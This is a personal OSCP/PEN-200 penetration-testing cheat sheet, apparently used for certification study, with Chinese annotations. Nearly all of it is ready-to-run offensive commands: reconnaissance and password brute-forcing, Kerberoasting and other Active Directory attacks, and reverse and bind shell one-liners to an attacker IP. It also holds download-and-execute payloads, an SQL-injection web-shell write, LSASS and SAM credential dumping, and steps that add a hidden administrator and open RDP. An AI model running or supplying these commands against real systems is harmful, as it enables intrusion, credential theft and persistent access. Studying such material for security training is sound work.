---
title: '[OSCP, PEN-200] Cheat Sheet'
disqus: hackmd
---

[OSCP, PEN-200] Cheat Sheet
===

# Recon
## IP
### Nmap
- `nmap -sC -sV -T4 {IP}`\
- `sudo nmap -sS {IP}`\
- All ports:
`nmap -p- {IP}`
- SSH Credential: 
`nmap --script ssh-auth-methods -p22 {IP}`
#### - nmap UDP
- `nmap -sU --script snmp-info {IP}`
- `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {IP}`
- snmpwalk: v1 或 v2c
`snmpwalk -v1 -c public {IP}`
> -c private\
-c manager
-c security
- snmpbulkwalk: v2c 或 v3
`snmpbulkwalk -c public -v2c {IP}`

### Rustscan
- `rustscan -b 1000 --addresses {IP}`
## Path
### Dirb
- `dirb {URL}`
- `dirb {URL} -p {IP:proxy-port}`
### Dirsearch
- `dirsearch -t 50 -u {URL}`
### Gobuster
- `gobuster dir -u {URL} -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -o gobuster_http`
### ffuf
- `ffuf -t 50 -r -w /usr/share/dirb/wordlists/common.txt -u http://192.168.171.219/FUZZ -e .git,.php,.bak,.zip`
- `ffuf -t 50 -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.171.219/FUZZ -e ".php,.bak,.zip"`
- Subdomain
`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -c -mc 200`
- File extension
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{IP}/FUZZ.zip`

### windows path traversal
![image](https://hackmd.io/_uploads/S1hg-Oankl.png)
![image](https://hackmd.io/_uploads/H1zGZO6n1l.png)


## ftp
- `ftp anonymous@{IP} {Port}`
- `wget -r ftp://Anonymous@{IP}`
- `lftp -u anonymous, ftp://{IP} -e "mirror --verbose --parallel=5 --continue --target-directory ./{dir}; quit"`

## Http-proxy
- spose
```
┌──(chw㉿CHW)-[~/Tools/spose_http-proxy-scanner]
└─$ python3 spose.py --proxy http://{IP}:{http-proxy-port} --target {IP}
```
## [Rync](https://blog.gtwang.org/linux/rsync-local-remote-file-synchronization-commands/)
- `nmap -sV --script=rsync-list-modules -p {Port} {IP}`
- `rsync rsync://{IP}/{Module} --list-only`
- Download: 
`rsync -av {IP}:: {Module} .` \
`rsync -av rsync://{IP}/fox/ ./fox/`
- Upload: `rsync {File} {IP}:: {Module}`

## Windows & Samba
### [Enum4linux](https://hackmd.io/@CHW/BJ0sNztaR#enum4linux)
- `enum4linux -a {IP}`
### smbclient
- `smbclient -N //{IP}/{DIR}`
- `smbclient -L //{IP}/. -U "anonymous"`
- `smbclient //{IP}/{DIR} -U "{DOMIN}\{USER}"`
    - Download: `smbclient -N //{IP}/{DIR} -c "prompt OFF; recurse ON; mget *"`
    - `smbclient //{IP}/'{DIR}' -U 'V.Ventz' -c "recurse ON; prompt OFF; mget *"`
- `crackmapexec smb {IP} -u 'guest' -p '' --rid-brute`
-  `nmap -p 445 --script smb-vuln* {IP}`
- `ntds.dit` + `SYSTEM` 可以爆破 AD User
    - `impacket-secretsdump  -ntds "Active Directory/ntds.dit" -system registry/SYSTEM LOCAL`
    - 將 `username:RID:LM hash:NT hash:::` 改成 `NT hash`儲存成 ADUser.hash
        - 1. John: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ADUser.hash`
        - 2. Pass-the-Hash: `crackmapexec winrm 192.168.122.175 -u L.Livingstone -H ADUser.hash ` (user 逐一嘗試)
            - `evil-winrm -i {IP} -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`
    - OS :
        - SeBackupPrivilege
        - 查看 `C:\Windows\System32\config\SYSTEM`
        - Shadow copy
        - ` impacket-secretsdump  -system system -sam sam LOCAL`
### RPC
- `rpcclient -U '' -N $IP`
- `rpcclient -U "" {IP}`
- `rpcclient -U "{DOMAIN}\\{USER}" {IP}`
> `enumdomusers`: 所有使用者\
> `enumdomgroups`: 所有 Group\
`queryuser RID`: 查某個使用者資訊\
`netshareenum`: 列出共享資料夾\
`lsaquery`: 查詢本地安全機制\
`adduser / setuserinfo`: 嘗試建立帳號或修改密碼（需高權限）
`getdompwinfo`: 取得密碼策略
>> Password Policy:
>> `DOMAIN_PASSWORD_COMPLEX`: 開啟複雜度（需大小寫、數字、符號中任兩項）\
>> `DOMAIN_PASSWORD_NO_ANON_CHANGE`: 匿名用戶不能改密碼\
>> `DOMAIN_PASSWORD_NO_CLEAR_CHANGE`: 不允許明文方式更改密碼\
>> `DOMAIN_LOCKOUT_ADMINS`:系統管理員帳戶也會被鎖定（危險設定)\
>> `DOMAIN_PASSWORD_STORE_CLEARTEXT`: 密碼可以以明文儲存\
>> `DOMAIN_REFUSE_PASSWORD_CHANGE`: 使用者不得更改自己的密碼

>[!Tip]
> `svc` 開頭帳號 → 服務帳號，常用弱密碼：\
>`svc_helpdesk`\
>`svc_mssql`\
>`svc_tpl`\
>`svc_web`

- RPC - User: Kerberos AS-REP Roasting (找到 hash 不需驗證 TGT)
    - (No User) `impacket-GetNPUsers nagoya-industries.com/ -usersfile ADuser.txt -no-pass -format hashcat -dc-ip 192.168.122.21`
    - (User) `impacket-GetUserSPNs nagoya-industries.com/Fiona.Clark:Summer2023 -dc-ip 192.168.122.21 -request`
    若都 User 需要 Kerberos pre-authentication，不能進行 AS-REP Roasting\
    針對服務帳號 Kerberoasting，取得 TGS hash
    - `impacket-GetUserSPNs nagoya-industries.com/Fiona.Clark:Summer2023 -dc-ip 192.168.122.21 -request`
    - `{TGS-REP}`
    - `hashcat -m 13100 -a 0 {TGS-REP} /usr/share/wordlists/rockyou.txt --force`
### WinRM (5985/5986)
- `evil-winrm -i {IP} -u {User} -p {PWD}`
    - upload {File}
    - download {File}
    - menu
### SQL Server
Windows 驗證：
- `impacket-mssqlclient raj:'Password@1'@192.168.31.126 -windows-auth`

SQL 驗證：
- `impacket-mssqlclient sequel.htb/rose:'KxEPkKe6R8su'@10.10.11.51`
    - 嘗試 xp_cmdshell ：`EXEC xp_cmdshell 'whoami';`
    - 手動開啟：
    - `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
    - `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`

### Ldap
- `impacket-ldapsearch -u rose -p 'KxEPkKe6R8su' -d sequel.htb -dc-ip 10.10.11.51 -l 10.10.11.51 -t all`
- `nmap -n -sV -Pn --script "ldap* and not brute" {IP}`
- `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://{IP}" "(objectclass=*)"`
- `ldapsearch -x -H ldap://{IP} -D '' -w '' -b "DC=vault,DC=offsec" | grep sAMAccountName`
### Webdav
- `cadaver http://{IP}/webdav/`
### hydra
- SSH
`hydra -e nsr -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://{}`
- FTP
`hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.124.46 ftp`
- HTTP POST login forms
`hydra -e nsr -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form "/{Path}?login=1:username=admin&password=^PASS^:F={Failed word} "`
- web page pwd protected
`hydra -e nsr -l admin -P rockyou.txt {IP} http-get "/"`
- Spraying
`hydra -e nsr -L /Users/CWei/Tool/dirb/wordlists/others/names.txt -p "{PWD}" rdp://{IP}`

## Hash
### Hashcat
- `hashid '{HASH}' -m`
- `hashcat -m {mode} {file.hash} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`

## Wordlists
- rockyou: `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists`
- Protocol pwd: `/usr/share/seclists/Passwords/Default-Credentials`
- cewl 根據網站產生 wordlists
 `cewl -w custom_wordlist.txt {URL}`
- `cupp  -i`

## SQL
### Sqlite3
- `sqlite3 {DB file}`
- `sqlite> .tables`
- `sqlite> .schema users`
- `sqlite> SELECT * FROM users;`
- Admin: `sqlite> SELECT id, name, is_admin FROM user WHERE is_admin = 1;`
- (PBKDF2-HMAC-SHA256) Hash: `${username}:sha256:50000:${salt}:${digest}`
`sqlite3 _home_developer_gitea_data_gitea_gitea.db "select passwd,salt,name from user" | while read data; do 
  digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)
  salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)
  name=$(echo $data | cut -d'|' -f3)
  echo "${name}:sha256:50000:${salt}:${digest}"
done | tee sqlites3.hash`
- bcrypt (`$2a$12$...`) Hash: 
```
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
$2a$12$ot8ihGHYNN5YZ8xbXYmURu2CuT/xFzE5sj3XMNd3a6c3Wzze7fSsq
...
```
- `hashcat sqlites3.hash /usr/share/wordlists/rockyou.txt --user`
- [Mac] `hashcat gitea.hash /usr/share/wordlists/rockyou.txt --user`

# Intranet Penetration
## crackmapexec
![image](https://hackmd.io/_uploads/HJUI-iRh1e.png)
- `crackmapexec smb {IP} -u 'guest' -p '' --rid-brute`

## NetExec (NXC)
```
# SMB
nxc smb 192.168.1.10 -u administrator -p 'Passw0rd!' -x "whoami"
nxc smb 192.168.1.0/24 -u user -p pass --shares

# WinRM
nxc winrm 192.168.1.10 -u administrator -p 'Passw0rd!' -x "hostname"

#RDP
nxc rdp 192.168.1.10 -u administrator -p 'Passw0rd!'
nxc rdp 192.168.1.10 -u administrator -H <NTLM_HASH>

#LDAP
nxc ldap 192.168.1.5 -u 'oscp.local\user' -p 'Passw0rd!' --groups

# MSSQL
nxc mssql 192.168.1.20 -u sa -p 'Passw0rd!' -x "SELECT @@version"

#SSH
nxc ssh 192.168.1.50 -u root -p toor -x "id"
```

### Password
- SMB 
`crackmapexec smb {IP} -u user.txt -p /usr/share/wordlists/rockyou.txt --shares` 
- WinRM 
`crackmapexec winrm {IP} -u administrator -p 'Passw0rd!'`
- RDP
`crackmapexec rdp {IP} -u user.txt -p pass.txt`
### User
- SMB
`crackmapexec smb {IP} --users`\
`crackmapexec smb {IP} -u '' -p '' --users`
- Ldap
`crackmapexec ldap {IP} -u '' -p '' --users`

## winrm
- `evil-winrm -i {IP} -u {USER} -H {HASH}`
- `evil-winrm -i {IP} -u {USER} -p {PWD}`

## Sharphound
- Path: `/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1`
- `powrshell -ep bypass`
- `. .\SharpHound.ps1`
- `Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\L.Livingstone\Documents"`

## Bloodhound
- `bloodhound-python -u {USER} -p {PWD} -d nagoya-industries.com -dc nagoya.nagoya-industries.com -ns 192.168.122.21 --dns-tcp --disable-autogc -c all`
- (回傳 Kali)
    - (Windows) `(New-Object Net.WebClient).DownloadFile("http://{Kali IP}/nc.exe", "C:\Users\f.frizzle\Desktop\nc.exe")`
    - (kali) `nc -lvnp 55688 > BloodHound.zip`
    - (Windows) `cmd /c ".\nc.exe {Kali IP} 55688 < 20250518152732_BloodHound.zip"`
- 標記 User as Owned: `MATCH (u:User) RETURN u`


###  Shadow Credentials 
攻擊條件:\
`GenericAll` or `GenericWrite` or `WriteOwner`
- 取得 Kerberos TGT 與 NTLM Hash (target: `ca_svc`)
`certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51`
- 更改 Object Owner (target: `ca_svc`)
`bloodyAD -d sequel.htb --dc-ip 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'`
- 操控 DACL → 取得完整控制權
`impacket-dacledit -action write -principal ryan -target ca_svc -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysDQbGb3`
- 再次嘗試 Shadow Credentials Attack
`certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51`
- [AD CS template vul（ESC4）](https://hackmd.io/@CHW/r1X0wjUC1e#10-AD-CS-template-vul%EF%BC%88ESC4%EF%BC%89)

###  RecycleBin
>[!Important]
>- `Namespace(0xA)` 代表 回收桶（Recycle Bin）
>- `Namespace(0x10)` 代表 使用者的桌面資料夾

還原回收桶備份檔
```
PS C:\Users\f.frizzle> $shell = New-Object -ComObject Shell.Application
PS C:\Users\f.frizzle> $recycleBin = $shell.Namespace(0xA)
PS C:\Users\f.frizzle> $recycleBin.Items() | Select-Object Name, Path

Name                  Path
----                  ----
wapt-backup-sunday.7z C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z

PS C:\Users\f.frizzle> $item = $recycleBin.Items() | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
PS C:\Users\f.frizzle> $desktop = (New-Object -ComObject Shell.Application).Namespace(0x10)
PS C:\Users\f.frizzle> $desktop.MoveHere($item)
PS C:\Users\f.frizzle> ls .\Desktop\

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/24/2024  9:16 PM       30416987 wapt-backup-sunday.7z
```

## Ntlm-theft
- Path: `/home/chw/Tools/ntlm_theft`
- `python3 ntlm_theft.py -g lnk -s {Kali IP} -f chw`

# AD
## - AS-REP Roasting
- 找出無需 Kerberos preauthentication 的帳戶:
    - Windows: (PowerView.ps1)`Get-DomainUser -PreauthNotRequired`
    - Kali: `impacket-GetNPUsers frizz.htb/ -dc-ip 10.10.11.60 -no-pass -usersfile /usr/share/dirb/wordlists/others/names.txt`\
(`/usr/share/seclists/Usernames/top-usernames-shortlist.txt`)
- AS-REP Roasting
    - Windows: `.\Rubeus.exe asreproast /nowrap`
    - Kali: `impacket-GetNPUsers -dc-ip 192.168.181.70  -request -outputfile hashes.asreproast corp.com/pete`

如果無法找到啟用了 "Do not require Kerberos preauthentication" 的帳戶，但擁有某個用戶的 GenericWrite 或 GenericAll 權限
- `Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='4194304'}`
- 破解密碼後還原設定: `Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='512'}`

## - Kerbrute passwordspray
- `kerbrute passwordspray -d frizz.htb --dc 10.10.11.60 \TheFrizz_user.txt '!suBcig@MehTed!R'`


## - Kerberoasting
- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
-  NTLM 
    - `sudo impacket-GetUserSPNs -request -dc-ip 192.168.181.70 corp.com/pete`\
    - [-] NTLM negotiation failed.
- Kerberos
    - `impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.10.11.60`
    - [*] Saving ticket in f.frizzle.ccache

## Group Policy Object (GPO) Abuse
- Group Policy Creator Owners

```
PS C:\Users\M.SchoolBus\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes                             
                        
============================================ ================ ============================================== ===============================================================
...
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group

PS C:\Users\M.SchoolBus\Desktop> New-GPO -Name chw | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes    

GpoId       : 0329b9b2-02c7-4796-a039-fb5123d758fb
DisplayName : chw
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 3
```
![image](https://hackmd.io/_uploads/H197rJitlx.png)
(Kali 匯入 SharpGPOAbuse.exe)
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ sudo ntpdate -u 10.10.11.60                                        
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.10.11.60
...
[*] Saving ticket in M.SchoolBus.ccache                                                        
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ export KRB5CCNAME=M.SchoolBus.ccache                       
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ KRB5CCNAME=M.SchoolBus.ccache \
scp -P 22 -o GSSAPIAuthentication=yes -o PreferredAuthentications=gssapi-with-mic \
  ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/Users/m.schoolbus/Desktop/"
SharpGPOAbuse.exe                                                                                                 100%   79KB  70.3KB/s   00:01    

┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ nc -lvnp 8888               
listening on [any] 8888 ...

```
```
PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --addcomputertask --gponame "chw" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e ...=="
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "chw" is: {BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!

PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```





# Vuln
### WPscan
- `wpscan --url {URL} --enumerate p --plugins-detection aggressive `
- user:
`wpscan --url {URL} --enumerate u`
- Brute password
`wpscan --url {URL} -U username.txt -P custom_wordlist.txt --force`
> username.txt 可從上方 enumerate 得知

### File crack
- zip
    - `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt {ZIP file}}`
    - John:
        - `zip2john {ZIP file} > zip_hash.txt`
        - `john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt`
        - `john --show zip_hash.txt`
- pdf
``pdfcrack -f {PDF file} -w /usr/share/wordlists/rockyou.txt``

# Exploit
## Searchsploit
- Update DB: `searchsploit -u`
- `searchsploit {Name}`
- `searchsploit -x {exploit ID}`
- `searchsploit -m {exploit ID}`

## Reverse Shell
### PHP shell
- Linux: `/home/chw/Desktop/Tool_upload/chw_revshell_linux.php` ([pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))
- Linux & Windows: `/home/chw/Desktop/Tool_upload/chw_revshell_all.php` ([ivan-sincek](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php))
### Linux
- [Reverse Shell Generator](https://www.revshells.com/)
- Tcp: `/bin/bash -i >& /dev/tcp/{IP}/{Port} 0>&1`
- Udp: `bash -i > /dev/udp/{IP}/{Port} 0>&1`
- Netcat: `nc -e /bin/sh {IP} {Port}`
- Cmd: `echo "wget http://{IP}/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh" > web-control`
- Python3: 
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
- Python3 (With TTY):
```
python3 -c 'import socket,subprocess,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{IP}",{Port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'
```
- Python2:
```
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
### Windows
- msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={port} -f exe -o chw_windows.exe
```
> `powershell -c \"Invoke-WebRequest -Uri http://192.168.45.165/chw_windows.exe -OutFile C:\\windows\\temp\\rs.exe; Start-Process C:\\windows\\temp\\rs.exe\`
- php
```
$command = shell_exec('mkdir c:\pwn && powershell.exe wget "http://{ip}/nc.exe" -outfile "c:\pwn\nc.exe" && c:\pwn\nc.exe -e cmd.exe {IP} {Port}');
echo "<pre>$command</pre>";
```
- sqli PHP (wget + exe)
```
SELECT "<?php system('powershell -c \"Invoke-WebRequest -Uri http://{IP}/chw_windows.exe -OutFile C:\\windows\\temp\\rs.exe; Start-Process C:\\windows\\temp\\rs.exe\"'); ?>" 
INTO OUTFILE "C:/wamp/www/chw.php"
```
### msfvenom
- `msfvenom -p <PAYLOAD> -f <FORMAT> -o <輸出檔案> <選項>`
- Windows reverse shell:\
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o chw.exe`
- Linux reverse shell:\
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o chw.elf`
- PHP reverse Shell:\
`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > chw.php`
- PowerShell code:\
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh > chw.ps1`
- Base64 encode PowerShell code:\
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd`

## Bind Shell
- `nc -l -v -p 6666 -e /bin/sh`
- `nc {IP} 6666`
- 再使用 pyhton 開 Pty: `python3 -c "import pty;pty.spawn('/bin/bash')"`

## Interactive shell
- Vi editor to escape restricted shell
```
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
tom@DC-2:~$ export PATH=/bin:/usr/bin:$PATH
-rbash: PATH: readonly variable
tom@DC-2:~$ python -c 'import os; os.system("/bin/sh")'
-rbash: python: command not found
tom@DC-2:~$ python3 -c 'import os; os.system("/bin/sh")'
-rbash: python3: command not found
vi

:set shell=/bin/sh
:shell
$ whoami: not found
$ bash -i
/bin/sh: 2: bash: not found
$ export PATH=/bin:/usr/bin:$PATH
$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
```


# Privileges Escalation
## Linux
### System
- OS: `uname -a`
- Kernel: `cat /etc/lsb-release`
### Writable File
- `find / -writable -type d 2>/dev/null`

### LinPEAS
- `ls /home/chw/Desktop/upload_file`

### Sudo
- `sudo -l`, `sudo -i`

### /etc/passwd
- 檢查 /etc/passwd 寫入權限
`ls -lah /etc/passwd`

### SUID 
- `find / -perm -u=s -type f 2>/dev/null`
- `find / -type f -perm -04000 -ls 2>/dev/null`
- `find / -user root -type f -perm -04000 -ls 2>/dev/null`
- 若 SUID `/usr/libexec/polkit-agent-helper-1`
    - `ls -la /usr/bin/pkexec` (u+s)
    - `dpkg -l | grep polkit`: Polkit 版本 0.105 (CVE-2021-4034)
    - [PwnKit](https://github.com/ly4k/PwnKit)
### [Cron](https://hackmd.io/@CHW/rkjNgyi51x#Abusing-Cron-Jobs)
- `grep "CRON" /var/log/syslog`


## Windows
- Low priv confirm system environment
`[Environment]::Is64BitOperatingSystem`, `[Environment]::Is64BitProcess`
- find powershell: 
`dir /s /b C:\powershell.exe`
- Search for strings containing 'Administrator'
`Select-String -Path "C:\Users\**\*" -Pattern "Administrator" -ErrorAction SilentlyContinue`
- Search Filename
`Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Filter "*DVR*" `
    - mysql: 
        - `dir C:\xampp\mysql\data\mysql\global_priv.*`\
        - `Get-ChildItem -Path C:\xampp\mysql\ -Recurse -Include *.sql,*.txt,*.cnf,*.ini` (`*.bat`, `*.kdbx`, `*.zip`)
        - `Select-String -Path C:\xampp\mysql\**\* -Pattern "password", "auth", "user", "connection"`
- Get File: `iwr`, `wget`, `curl`, (-UseBasicParsing)
    - `certutil -urlcache -split -f http://{IP}/{File} {Output File}`
    - `(New-Object Net.WebClient).DownloadString("http://{IP}/{File}")`

>[!Tip]
>`IEX (New-Object sNet.WebClient).DownloadString('http://10.10.14.71/SharpHound.ps1')`\
>下載並執行 PowerShell 原始碼（純文字）
>>✅ 用途：立即執行從遠端伺服器下載的 PowerShell 原始碼（如 .ps1)\
>>`DownloadString` 是用來處理文字（如 PowerShell 腳本），無法下載二進位檔 (exe)

![image](https://hackmd.io/_uploads/r1U9WH6hJx.png)
![image](https://hackmd.io/_uploads/Skx2bBp3Jx.png)
![image](https://hackmd.io/_uploads/S1an-r631g.png)

### whoami /priv
- SeImpersonatePrivilege: PrintSpoofer
冒充高權限 client token
    - [SigmaPotato](https://hackmd.io/@CHW/H1F8rLl5kg#SigmaPotato):`/home/chw/Desktop/upload_tools/SigmaPotato.exe`
        - `.\SigmaPotato "net user chw chw /add"`
        - `.\SigmaPotato "net localgroup Administrators chw /add"`
        - (No GUI) `runas /user:chw "C:\users\{User}\desktop\nc.exe -e cmd.exe {IP} {Port}" ` 
        - or rdp
        ```
        net user chw chw
        net localgroup Administrators chw /add
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
        netsh firewall set service remoteadmin enable
        netsh firewall add portopening TCP 3389 RDP enable
        ```
    - [Juicy-Potato-x86](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2):`/home/chw/Desktop/upload_tools/Juicy.Potato.x86.exe`
        - Windows 7/2008 R2 (x86/x64)
        - [CLID Search](https://github.com/ohpe/juicy-potato/tree/master/CLSID/?source=post_page-----96e74b36375a---------------------------------------)
        - `.\Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe {IP} {Port}" -t * -c {{CLID}}`

- SeBackupPrivilege: Shadow Copy
可繞過 NTFS ACL，讀取 SAM/SECURITY/SYSTEM registry hive
    - 查看 `C:\Windows\System32\config\SYSTEM`
    - `reg save HKLM\SYSTEM system`
    - `reg save HKLM\SAM sam`
    - (Kali) `impacket-secretsdump  -system system -sam sam LOCAL`

- SeRestorePrivilege: Utilman.exe Hijack
繞過 ACL 覆寫 Windows 系統檔案
    - ` mv C:/Windows/System32/Utilman.exe C:/Windows/System32/Utilman.old `
    - `mv C:/Windows/System32/cmd.exe C:/Windows/System32/Utilman.exe`
    - Restart or logout ex.`RDP` 

- SeDebugPrivilege: Dump LSASS
可 attach 到 SYSTEM 等級的行程
    - [Procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump?utm_source=chatgpt.com):`/home/chw/Desktop/upload_tools/Procdump/`
        - `procdump.exe -ma lsass.exe lsass.dmp`
    - Mimikatz
        - `sekurlsa::logonpasswords`

- SeTakeOwnershipPrivilege
奪取檔案或服務的所有權，再修改 ACL → 寫入惡意檔
    - `takeown /f C:\Windows\System32\utilman.exe`(`cmd.exe`): 獲取 utilman 所有權
    - `icacls C:\Windows\System32\utilman.exe /grant chw:F`: 修改檔案 ACL，把帳號 chw 加入
    
- SeLoadDriverPrivilege
載入惡意驅動，能直接修改記憶體，注入 SYSTEM shell
    - [KDU](https://github.com/hfiref0x/KDU), [TDL](https://github.com/hfiref0x/TDL)
        - `kdu.exe -map 0 drv\rtcore64.sys`
        - `whoami`
        - `kdu.exe -drvl -pshell`

- SeCreateSymbolicLinkPrivilege
建立 symlink 讓高權服務將檔案寫入控制的位置
    - [CreateSymlink.exe](https://github.com/googleprojectzero/symboliclink-testing-tools): `/home/chw/Desktop/upload_tools/CreateSymlink.exe`
        - `CreateSymlink.exe C:\Temp\log.txt C:\Windows\System32\services.exe`
        - `echo @echo off > C:\Users\chw\Desktop\evil.bat`
        - `echo C:\users\chw\desktop\nc.exe -e cmd.exe {IP} {Port} >> C:\Users\chw\Desktop\evil.bat`
        
- SeDelegateSessionUserImpersonatePrivilege
類似 SeImpersonate，但限制在同一個 logon session (要有高權限使用者在同一個 session)
    - DSUI: [Tokenvator](https://github.com/0xbadjuju/Tokenvator) `/home/chw/Desktop/upload_tools/Tokenvator.exe`
        - `whoami /priv | findstr /i delegate` `query user`: 所在的 SESSIONNAME/ID
        - `gps -IncludeUserName | ? {$_.SessionId -eq (Get-Process -Id $PID).SessionId} |
  sort -desc WS | select -first 30 Name,Id,UserName,SessionId | ft -auto`\ 
  找一個 UserName 為 `.\Administrator/DOMAIN\Admin` 或 `NT AUTHORITY\SYSTEM` 的 PID
      - `Tokenvator.exe list`
      - `Tokenvator.exe steal_token -p <PID> -c "C:\Windows\System32\cmd.exe"`
      - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) `/home/chw/Desktop/upload_tools/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1`
      - Windows
        ```
        Import-Module .\Invoke-TokenManipulation.ps1
        Invoke-TokenManipulation -ImpersonateUser -ProcessId <PID>
        Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\cmd.exe"
        ```

### PowerUp.ps1
- `Get-ModifiableServiceFile`
- ![image](https://hackmd.io/_uploads/r1tZs5ahJe.png)
- ![image](https://hackmd.io/_uploads/By_do5ph1e.png)

### [Binary Hijacking](https://hackmd.io/@CHW/H1F8rLl5kg#Service-Binary-Hijacking)
- Search WMI: win32_service
    `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
- `icacls "{File}"`

### [DLL Hijacking](https://hackmd.io/@CHW/H1F8rLl5kg#Use-the-Event-Viewer-to-search-for-events-recorded-by-Script-Block-Logging) 
- Search WMI: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
